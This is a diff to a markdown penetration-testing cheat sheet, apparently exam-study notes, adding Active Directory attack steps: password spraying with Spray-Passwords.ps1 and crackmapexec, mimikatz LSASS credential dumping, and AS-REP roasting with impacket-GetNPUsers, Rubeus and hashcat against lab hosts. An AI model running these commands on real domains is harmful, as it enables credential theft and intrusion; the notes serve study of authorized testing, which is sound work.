@@ -457,7 +457,8 @@ Import-Module .\PowerView.ps1 #loading module to powershell, if it gives error t
 Get-NetSession -ComputerName files04 -Verbose #Checking logged on users with Get-NetSession, adding verbosity gives more info.
 Get-NetUser | select cn,pwdlastset,lastlogon
 Get-NetUser -SPN | select samaccountname,serviceprincipalname # Listing SPN accounts in domain
-Get-NetGroup | select cn
+Get-NetGroup | select cn    #user list for password attacks
+Get-DomainUser -PreauthNotRequired #quick win for AS-REP 
 Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion #attack old OS and see which are web server or file server
 Find-LocalAdminAccess #scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain
 Get-NetSession -ComputerName *client74* #
@@ -557,9 +558,16 @@ PS C:\tmp > mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > 
 impacket-secretdump exam.com/apachesvc@192.168.1xx.101
 ```
 
+- Brute force small number of guess passwords on list of found usernames (tool: Spray-Passwords.ps1)
+  ```bash
+  #using LDAP and ADSI to perform a low and slow password attack against AD users
+  .\Spray-Passwords.ps1
+    .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
+  ```
+  
 - Spray with known password on list of found usernames
 ```bash
-# Crackmapexec - check if the output shows 'Pwned!'
+# Crackmapexec uses SMB - check if the output shows 'Pwned!'
 crackmapexec <protocol> <target(s)> -u username1 -p password1 password2
 crackmapexec <protocol> <target(s)> -u username1 username2 -p password1
 crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords
@@ -573,11 +581,6 @@ crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_con
 kerbrute passwordspray -d corp.com .\usernames.txt "pass"
 ```
 
-- Brute force small number of guess passwords on list of found usernames (tool: Spray-Passwords.ps1)
-  ```bash
-  .\Spray-Passwords.ps1
-  ```
-
 ### Pass the hash
 
 - Access local SAM database and dump all local hashes
@@ -589,6 +592,8 @@ PS C:\users\public > mimikatz.exe "privilege::debug" "lsadump::sam" "exit" > sam
 - Obtaining hash of an SPN user using **Mimikatz** (Tool: mimikatz)
 
 ```powershell
+#dump hashes for all users logged on to the current workstation or server, including remote logins like Remote Desktop sessions.
+#dump credentials stored in LSASS and cache hashes
 privilege::debug
 sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
 ```
@@ -730,6 +735,31 @@ mimikatz # kerberos :: list /export
 #crack hash using kirbi2john.py
 python3 kirbi2john.py /root/pen200/exercise/ad/sgl.kirbi
 ```
+
+### AS-REP roasting
+- Find user account with user account option "Do not require Kerberos preauthentication" ENABLED, then obtain their password thru AS-REP hashes
+#### on Kali
+```bash
+# [KALI] find users (not user1) who "Do not require Kerberos preauthentication"
+impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/user1
+
+# [KALI] hashcat with option 18200 for AS-REP, to obtain the plaintext password of user who "Do not require Kerberos preauthentication"
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+#### on windows (use Rubeus)
+```bash
+#extract AS-REP hash
+.\Rubeus.exe asreproast /nowrap
+
+#copy to kali to run hash cat
+sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+### Targeted AS-REP roasting
+- condition: cannot identify any AD users with the account option "Do not require Kerberos preauthentication" enabled && notice that we have GenericWrite or GenericAll permissions on another AD user account
+- leveraging "GenericWrite or GenericAll" permissions, we can modify the User Account Control value of the user to not require Kerberos preauthentication
+- Once enabled "Do not require Kerberos preauthentication" of the user, do AS-REP roasting
+- Finally, reset the User Account Control value of the user once we’ve obtained the AS-REP hash
 
 # MISC
 
